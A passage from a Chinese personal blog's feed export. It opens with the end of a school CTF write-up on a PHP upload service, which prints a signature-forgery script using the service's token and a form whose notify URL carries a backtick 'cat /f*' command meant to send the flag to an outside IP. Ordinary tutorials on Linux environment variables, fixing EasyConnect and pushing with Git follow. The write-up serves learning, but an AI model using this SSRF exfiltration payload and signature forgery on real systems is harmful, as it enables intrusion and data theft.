<span class="title">sign_verify</span>(<span class="params"><span class="variable">$params</span>,<span class="variable">$sign</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sign_params</span>(<span class="variable">$params</span>) == <span class="variable">$sign</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 回调通知上传</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $url</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $param</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool|string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_notify</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 生成签名</span></span><br><span class="line">        <span class="variable">$sign</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sign_params</span>(<span class="variable">$param</span>);</span><br><span class="line">        <span class="variable">$param</span>[<span class="string">&#x27;sign&#x27;</span>] = <span class="variable">$sign</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 请求地址</span></span><br><span class="line">        <span class="variable">$request_url</span> = <span class="variable">$url</span>.<span class="string">&#x27;?&#x27;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="title function_ invoke__">http_build_query</span>(<span class="variable">$param</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$request_url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="literal">FALSE</span>);</span><br><span class="line">        <span class="comment">//利用点!</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Server</span>::<span class="title function_ invoke__">create</span>([<span class="string">&#x27;token&#x27;</span> =&gt; <span class="string">&#x27;QiuQIuYyds&#x27;</span>, <span class="string">&#x27;upload_path&#x27;</span> =&gt; <span class="string">&#x27;/upload/&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>我觉得应该就是ssrf漏洞结合<code>curl_exec</code>外带,但是一直没外带成功,可能是我分析的地方有问题</p><p>Maybe外带的思路也不对?</p><p>为了伪造这个请求,首先要上传一个文件,然后服务器对签名进行校验,校验签名的机制都写在代码给你了,分析一下不难发现就是把传入的参数进行排序拼接再加个<code>token</code>拼接起来<code>md5</code>    hash一下.</p><p>伪造签名脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">?<span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sign_params</span>(<span class="params"><span class="variable">$params</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="variable">$token</span> = <span class="string">&#x27;QiuQIuYyds&#x27;</span>;</span><br><span class="line">        <span class="comment">// 过滤参数</span></span><br><span class="line">        <span class="variable">$params</span> = <span class="title function_ invoke__">array_filter</span>(<span class="variable">$params</span>,function(<span class="variable">$key</span>) <span class="keyword">use</span> ($<span class="title">params</span>)&#123;</span><br><span class="line">            <span class="title">if</span>(<span class="title">empty</span>($<span class="title">params</span>[$<span class="title">key</span>]) || $<span class="title">key</span> == &#x27;<span class="title">sign</span>&#x27;)&#123;</span><br><span class="line">                <span class="title">return</span> <span class="title">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;,ARRAY_FILTER_USE_KEY);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ascii排序</span></span><br><span class="line">        <span class="title function_ invoke__">ksort</span>(<span class="variable">$params</span>);</span><br><span class="line">        <span class="title function_ invoke__">reset</span>(<span class="variable">$params</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 签名</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">urldecode</span>(<span class="title function_ invoke__">http_build_query</span>(<span class="variable">$params</span>)) . <span class="variable">$token</span>);<span class="comment">//绕过!</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$params</span> = [</span><br><span class="line">    <span class="string">&#x27;uid&#x27;</span> =&gt; <span class="string">&#x27;index.php&#x27;</span>, <span class="comment">// 替换为目标用户的实际 ID</span></span><br><span class="line">    <span class="string">&#x27;notify&#x27;</span> =&gt; <span class="string">&#x27;http://47.236.170.130:8081/`cat /f*`&#x27;</span>, <span class="comment">// 伪造的通知 URL</span></span><br><span class="line">    <span class="comment">// &#x27;file&#x27; =&gt; &#x27;file:///flag&#x27; // 伪造的文件路径</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$notify</span>=<span class="string">&#x27;http://47.236.170.130:8081/`cat /f*`&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_notify</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 生成签名</span></span><br><span class="line">        <span class="comment">//74$res = $this-&gt;upload_notify($_GET[&#x27;notify&#x27;],$info);//在这执行</span></span><br><span class="line">        <span class="variable">$sign</span> = <span class="title function_ invoke__">sign_params</span>(<span class="variable">$param</span>);<span class="comment">//观察传参行为!</span></span><br><span class="line">        <span class="variable">$param</span>[<span class="string">&#x27;sign&#x27;</span>] = <span class="variable">$sign</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 请求地址</span></span><br><span class="line">        <span class="variable">$request_url</span> = <span class="variable">$url</span>.<span class="string">&#x27;?&#x27;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="title function_ invoke__">http_build_query</span>(<span class="variable">$param</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$request_url</span>;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$request_url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="literal">FALSE</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);<span class="comment">//ssrf</span></span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// $token = &#x27;QiuQIuYyds&#x27;; // 已知的 token</span></span><br><span class="line"><span class="comment">// $signature = md5(urldecode(http_build_query($params)) . $token);</span></span><br><span class="line"><span class="comment">// echo sign_params(params: $params);</span></span><br><span class="line"><span class="title function_ invoke__">upload_notify</span>(<span class="variable">$notify</span>,<span class="variable">$params</span>);</span><br><span class="line"><span class="comment">// http://121.41.53.189:36446/?uid=aa&amp;notify=file:///flag&amp;sign=fcfd46d234326f64bd3f9b6f97cf3748&amp;file=file:///flag</span></span><br></pre></td></tr></table></figure><p>伪造请求发包表单:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传表单<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://121.41.53.189:36739/?uid=index.php&amp;notify=http://47.236.170.130:8081/`cat /f*`&amp;sign=c03ddc84442095751b4122a5652dbf8c&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传文件&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>分析到这儿了,写作业去了(还有一堆实验报告)    ~悲~</p><p>OK,这次CTF校赛初赛就到这了ba.</p><p>正常发挥只能算是~</p><p>还要继续加油!</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下环境变量配置</title>
      <link href="/posts/4be92c95.html"/>
      <url>/posts/4be92c95.html</url>
      
        <content type="html"><![CDATA[<p>常用修改环境变量的两种方式：</p><ol><li>临时设置<br>比如我们刚刚安装了golang，要把GOROOT加入到环境变量中：<code>export PATH=$PATH:/usr/lib/go-1.9</code>。如果原来环境变量是<code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin</code>的话，执行过<code>export</code>命令后的环境变量就会变成：<code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin:/usr/lib/go-1.9</code>。所有我们执行<code>export PATH=$PATH:/usr/lib/go-1.9</code>相当于：</li></ol><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$PAT</span>H = <span class="string">&quot;/usr/local/sbin:/usr......&quot;</span></span><br><span class="line"><span class="symbol">$GOROOT</span> = <span class="string">&quot;/usr/lib/go-1.9&quot;</span></span><br><span class="line"><span class="symbol">$PAT</span>H = <span class="symbol">$PAT</span>H + <span class="symbol">$GOROOT</span></span><br></pre></td></tr></table></figure><p>如何用命令查看修改后的环境变量：<br><code>echo $PATH</code> 或者 <code>env</code></p><ol><li>永久性设置<br>找到<code>profile</code>文件，然后编辑它：</li></ol><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vi /etc<span class="built_in">/profile</span></span><br><span class="line"><span class="built_in"></span><span class="comment">#添加以下内容</span></span><br><span class="line"><span class="built_in">export</span> <span class="attribute">GOROOT</span>=/usr/lib/go-1.9</span><br><span class="line"><span class="built_in">export</span> <span class="attribute">GOBIN</span>=<span class="variable">$GOROOT</span>/bin</span><br><span class="line"><span class="built_in">export</span> <span class="attribute">GOAPTH</span>=<span class="variable">$GOROOT</span>/src</span><br><span class="line"><span class="built_in">export</span> <span class="attribute">GO_WORK_PATH</span>=/home/workspace/go #自定义的工作空间</span><br><span class="line"><span class="comment">#前面只是定义了变量，最后一句是关键</span></span><br><span class="line"><span class="built_in">export</span> <span class="attribute">PATH</span>=<span class="variable">$PATH</span>:$GOROOT:$GOBIN:$GOPATH:$GO_WORK_PATH</span><br></pre></td></tr></table></figure><p>要想立即生效就要执行：<br><code>source /ect/profile</code><br>重启<code>reboot</code>然后<code>echo $PATH</code>发现环境变量还是我们重启前设置的，并没有因为重启而失效。</p><p><strong>然而</strong>，有时候，你会发现重启之后，环境变量和我们设置完全不一行。这个时候，就需要找到<code>.bashrc</code>文件：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi ~/.bashrc</span><br><span class="line"><span class="comment">#发现最下面有以下几行：</span></span><br><span class="line"><span class="built_in">export</span> <span class="attribute">GOROOT</span>=/home/lib</span><br><span class="line"><span class="built_in">export</span> <span class="attribute">GOBIN</span>=<span class="variable">$GOROOT</span>/bin</span><br><span class="line"><span class="built_in">export</span> <span class="attribute">GOAPTH</span>=<span class="variable">$GOROOT</span>/src</span><br></pre></td></tr></table></figure><p>原来是因为<code>.bashrc</code>文件里的设置“覆盖”了我们在<code>profile</code>里的设置，好，我们现在注释（删除）这几行，重启。我们设置的环境变量终于生效了。</p><blockquote><p>总之,bashrc里面的环境变量是一直会执行的</p><p>而我们在命令行中 export 执行的话只针对当前shell有用</p><p>关闭后重新开启又会执行默认配置文件里的配置选项</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 新手村的操作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux_eazyconnect使用</title>
      <link href="/posts/dc7789b0.html"/>
      <url>/posts/dc7789b0.html</url>
      
        <content type="html"><![CDATA[<p>参考了许多网上的文章，发现都无法很好彻底的指导小白进行解决问题。这里完整的记录下如何解决的方案： 首先是下载EasyConnect.deb文件</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/246f1e829e974c70a9b57a92b7ddc10e~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?" alt="Screenshot from 2022-07-17 14-37-58.png"></p><p>然后使用dpkg -i命令进行安装：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">css</span><br><span class="line">复制代码sudo dpkg -<span class="selector-tag">i</span> <span class="selector-attr">[name of installation package]</span></span><br></pre></td></tr></table></figure><p>安装完成后进行启动：这个时候大概率是无法启动成功的。小弟看了下报错：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d68f493ffbb642a08f3e1718f0bc105e~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?" alt="Screenshot from 2022-07-17 08-44-35.png"></p><p>不过大概率是看不懂的，因为我看来看去也就是DMR0异常中断，这玩意就是非正常的缺页中断，也就是无法找到某个物理地址下的文件。小弟功力有限，只能继续在百度上搜索解决方案，下面这篇文章讲的还算不错，但还是有些关键的地方一笔代过了，其实主要的原因就是libpango这个包在Ubuntu22.04（或者18.04等更高的版本中）版本太高了，需要进行降版本处理。 <a href="https://link.juejin.cn/?target=https%3A%2F%2Fwww.cnblogs.com%2Fzj420255586%2Fp%2F14211474.html">www.cnblogs.com/zj420255586…</a></p><p>下面我具体将下处理步骤： 1.查看涉及到需要降级的文件</p><p>1.1 先查看EasyConnect的安装位置</p><p>由于我是通过dpkg命令来安装的，因此这里使用如下命令查看（显示于软件包关联的文件的命令），这个命令的主要作用就是 “查看软件安装到什么地方”</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">复制代码dpkg -L easyconnect</span><br></pre></td></tr></table></figure><p>小弟这边执行后，显示结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">bash复制代码Vostro-5471:~$ dpkg -L easyconnect</span><br><span class="line">/.</span><br><span class="line">/etc</span><br><span class="line">/etc/init</span><br><span class="line">/etc/init/EasyMonitor.conf</span><br><span class="line">/usr</span><br><span class="line">/usr/lib</span><br><span class="line">/usr/lib/systemd</span><br><span class="line">/usr/lib/systemd/system</span><br><span class="line">/usr/lib/systemd/system/EasyMonitor.service</span><br><span class="line">/usr/share</span><br><span class="line">/usr/share/pixmaps</span><br><span class="line">/usr/share/pixmaps/EasyConnect.png</span><br><span class="line">/usr/share/applications</span><br><span class="line">/usr/share/applications/EasyConnect.desktop</span><br><span class="line">/usr/share/sangfor</span><br><span class="line">/usr/share/sangfor/EasyConnect</span><br><span class="line">/usr/share/sangfor/EasyConnect/LICENSE</span><br><span class="line">/usr/share/sangfor/EasyConnect/content_resources_200_percent.pak</span><br><span class="line">/usr/share/sangfor/EasyConnect/version</span><br><span class="line">/usr/share/sangfor/EasyConnect/LICENSES.chromium.html</span><br><span class="line">/usr/share/sangfor/EasyConnect/resources</span><br><span class="line">/usr/share/sangfor/EasyConnect/resources/electron.asar</span><br><span class="line">/usr/share/sangfor/EasyConnect/resources/conf</span><br><span class="line">/usr/share/sangfor/EasyConnect/resources/conf/need_hook_dns_server.ini</span><br><span class="line">/usr/share/sangfor/EasyConnect/resources/conf/ConfModuleMap.xml</span><br><span class="line">/usr/share/sangfor/EasyConnect/resources/conf/Version.xml</span><br><span class="line">/usr/share/sangfor/EasyConnect/resources/conf/LogConf.xml</span><br><span class="line">/usr/share/sangfor/EasyConnect/resources/conf/SurpportBrowser.xml</span><br><span class="line">/usr/share/sangfor/EasyConnect/resources/conf/Module.xml</span><br><span class="line">/usr/share/sangfor/EasyConnect/resources/default_app.asar</span><br><span class="line">/usr/share/sangfor/EasyConnect/resources/shell</span><br><span class="line">/usr/share/sangfor/EasyConnect/resources/shell/list_dns.sh</span><br><span class="line">/usr/share/sangfor/EasyConnect/resources/shell/sslservice.sh</span><br><span class="line">/usr/share/sangfor/EasyConnect/resources/shell/startrapp.sh</span><br><span class="line">/usr/share/sangfor/EasyConnect/resources/shell/sslcheck.sh</span><br></pre></td></tr></table></figure><p>EasyConnect的安装位置在 /usr/share/sangfor/EasyConnect</p><p>1.2查看涉及降级的文件</p><p>需要先进入到EasyConncet的安装目录 然后使用</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">perl</span><br><span class="line">复制代码ldd EasyConnect | <span class="keyword">grep</span> pango </span><br></pre></td></tr></table></figure><p>命令可以查看相关的依赖文件信息</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/062dff24164a4d9cbd9f590cef85acb3~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?" alt="image.png"></p><p>接下来需要作的就是去下载对应的低版本文件，去覆盖高依赖版本 注意有三个依赖包需要下载</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">复制代码libpangocairo-1.0.<span class="keyword">so</span>.0</span><br><span class="line">libpango-1.0.<span class="keyword">so</span>.0</span><br><span class="line">libpangoft2-1.0.<span class="keyword">so</span>.0</span><br></pre></td></tr></table></figure><p>2.下载对应依赖的低版本包</p><p>下载地址：<a href="https://link.juejin.cn/?target=http%3A%2F%2Fkr.archive.ubuntu.com%2Fubuntu%2Fpool%2Fmain%2Fp%2Fpango1.0%2F">kr.archive.ubuntu.com/ubuntu/pool…</a> 请根据自己的CPU架构类型，选择具体的版本，小弟是AMD64所以需要下载以下三个文件</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">复制代码libpangocairo<span class="string">-1</span>.0<span class="string">-0</span>_1.40.14<span class="string">-1</span>_amd64.deb</span><br><span class="line">libpangoft2<span class="string">-1</span>.0<span class="string">-0</span>_1.40.14<span class="string">-1</span>_amd64.deb</span><br><span class="line">libpango<span class="string">-1</span>.0<span class="string">-0</span>_1.40.14<span class="string">-1</span>_amd64.deb</span><br></pre></td></tr></table></figure><p>下载完成之后对这三个文件进行解压缩，提取出 data.tra.xz -&gt; usr -&gt; lib -&gt; x86_64-linux-gnu 下面的所有文件</p><p>3.覆盖EasyConnect安装目录下的pango依赖</p><p>将提取出来的文件，复制到EasyConnect的安装目录下，也就是在1.1步骤中的位置 使用cp 命令即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line">复制代码<span class="built_in">cp</span> <span class="built_in">source</span> /usr/share/sangfor/EasyConnect</span><br></pre></td></tr></table></figure><p>最后在/usr/share/sangfor/EasyConnect下确认下是否覆盖完成</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/523cfb9810b24554b3a584705ecd6cc0~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?" alt="image.png"> 发现所有的文件地址都指向了EasyConnet的安装位置 重启EasyConnect即可。</p><p>附录：</p><p>（1）ldd命令解释</p><p><a href="https://link.juejin.cn/?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F386776402">zhuanlan.zhihu.com/p/386776402</a></p><p>（2）dpkg命令说明</p><p><a href="https://link.juejin.cn/?target=https%3A%2F%2Fcloud.tencent.com%2Fdeveloper%2Farticle%2F1484940">cloud.tencent.com/developer/a…</a> 该命令的常用参数如下表格所列</p><table><thead><tr><th>-i</th><th>安装软件包</th></tr></thead><tbody><tr><td>-r</td><td>删除软件包</td></tr><tr><td>-l</td><td>显示已安装软件包列表</td></tr><tr><td>-L</td><td>显示于软件包关联的文件</td></tr><tr><td>-c</td><td>显示软件包内文件列表</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 新手村的操作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git推送远程仓库</title>
      <link href="/posts/f35c27cf.html"/>
      <url>/posts/f35c27cf.html</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="git命令行推送到远端仓库"><strong>git命令行推送到远端仓库</strong></h3></blockquote><p>==命令行模式,启动!==</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">进入需要推送的目录</span></span><br><span class="line">初始化: git init</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">把文件添加到版本库中</span> </span><br><span class="line">git add +文件名</span><br><span class="line">如推送整个文件夹:则推送所有文件 git add .</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用命令 git commit <span class="string">&quot;提交说明&quot;</span> 告诉Git，把文件提交到仓库。引号内为提交说明</span></span><br><span class="line">git commit  -m &quot;XXX说明&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关联到远程库 git remote add origin 你的远程库地址</span> </span><br><span class="line"> git remote add origin https://:..</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">此处有个坑,`https`...url每次推送到Github时需要输入密码,而git现在不支持仅密码验证,你又得去输一个token,而且token用起来很麻烦</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">因此在此说明,除非是你在服务器上的仓库,不然不推荐这样做!(服务器通过ssh密码一遍过就行)</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">所以怎样推送到github仓库呢?</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">我们remote设置连接url时,设置为:</span></span><br><span class="line">git remote add origin git@github.com:Eviden0/Webpage.git</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">选择github ssh下面那个url即可别选`https`!请看下面图片实例</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">git pull 获取远程库与本地同步合并(如果远程库不为空必须做这一步，否则后面的提交会失败)</span> </span><br><span class="line">git pull --rebase origin master(同步合并的分支) (master 或者main这里自己选)</span><br><span class="line">git push -u origin master(推送到远程的分支)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>==OK,一切搞定!舒舒服服==<em>到这里你就好好享受git这个工具带来的便捷吧!</em></p><p><img src="https://s1.vika.cn/space/2024/04/06/9eab35437e5a4451b195df9feffbdb72" alt=""></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">命令需要三个参数，github用户名(jack),第一步生成的token（12345）,仓库名称（exampleRepo）</span><br><span class="line">根据上述参数的例子，运行以下代码</span><br><span class="line">curl -u jack:12345 https://api.github.com/user/repos -d &#x27;&#123; &quot;name&quot;: &quot;exampleRepo&quot; &#125;&#x27;</span><br></pre></td></tr></table></figure><p>==坑:==被推的仓库已经包含文件时</p><p>此时需要同步以下本地和远端仓库的文件</p><p>==坑:==</p><p><a href="https://blog.csdn.net/hhgggggg/article/details/77853665">免密推送</a></p><p>​</p>]]></content>
      
      
      <categories>
          
          <category> 新手村的操作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二分查找</title>
      <link href="/posts/e8eb0481.html"/>
      <url>/posts/e8eb0481.html</url>
      
